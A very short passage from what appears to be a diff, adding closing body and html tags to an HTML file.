+    
+  </body>
+</html>
+
